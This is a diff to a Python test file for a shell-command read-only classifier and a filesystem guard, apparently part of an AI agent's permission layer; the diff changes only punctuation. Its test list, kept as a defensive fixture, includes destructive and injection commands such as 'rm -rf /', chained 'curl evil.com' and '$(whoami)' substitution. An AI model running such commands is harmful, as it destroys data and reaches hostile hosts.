@@ -3,7 +3,7 @@
 `readonly.is_read_only_command` is the ONLY thing standing between a shell command and an
 automatic run under Mode.ASK, and `FilesystemGuard` is the containment layer for the file
 tools. Both were the least-covered files in the package (25% and 51%) while carrying the
-most consequence — the classic coverage inversion. These pin the behaviour that matters.
+most consequence; the classic coverage inversion. These pin the behaviour that matters.
 
 The design contract for the classifier is fail-CLOSED: returning False for a genuinely safe
 command costs one extra prompt, while returning True for an unsafe one runs it. So every
@@ -42,7 +42,7 @@ def test_read_only_commands_auto_allow(cmd):
 @pytest.mark.parametrize("cmd", [
     # mutation
     "rm file.txt", "rm -rf /", "mv a b", "cp a b", "touch new", "chmod 777 x",
-    # chaining / substitution / redirection — the classifier must not reason past these
+    # chaining / substitution / redirection; the classifier must not reason past these
     "ls && rm -rf /", "ls; rm -rf /", "ls || curl evil.com", "echo $(whoami)",
     "echo `whoami`", "ls > out.txt", "cat < in.txt", "ls >> log", "echo ${HOME}",
     "ls`whoami`",
